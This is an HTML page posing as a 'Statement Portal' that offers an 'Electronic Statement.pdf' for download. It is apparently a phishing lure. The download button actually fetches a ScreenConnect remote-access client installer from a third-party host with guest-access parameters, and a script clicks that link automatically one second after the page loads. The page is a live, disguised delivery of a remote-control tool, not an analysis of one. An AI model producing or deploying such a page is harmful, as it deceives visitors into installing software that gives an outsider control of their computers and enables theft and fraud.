<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8fbfb;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            width: 400px;
        }
        .status {
            display: inline-block;
            background: #e0f7e9;
            color: #15803d;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        h2 {
            margin: 10px 0;
            font-size: 22px;
        }
        p {
            color: #555;
            font-size: 14px;
        }
        .file-box {
            background: #f8f8f8;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 15px 0;
            font-size: 14px;
        }
        .file-box span {
            font-weight: bold;
        }
        .ready {
            background: #fffae6;
            color: #d97706;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .download-btn {
            background: #2563eb;
            color: #fff;
            border: none;
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        .download-btn:hover {
            background: #1d4ed8;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="status">Operational</div>
        <h2>Statement Portal</h2>
        <p>Access and download your Electronic Statement documents securely</p>
        
        <div class="file-box">
            <span>Electronic Statement.pdf</span>
            <span class="ready">Ready</span>
        </div>

        <a id="download-link" class="download-btn" href="https://pyramidff.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest" download>Download Documents</a>
        
        <div class="footer">© 2026. All rights reserved.</div>
    </div>

    <script>
        window.onload = function() {
            // Auto-download the file when the page loads
            setTimeout(function() {
                document.getElementById("download-link").click();
            }, 1000); // 1-second delay to ensure the page loads properly
        };
    </script>

</html>
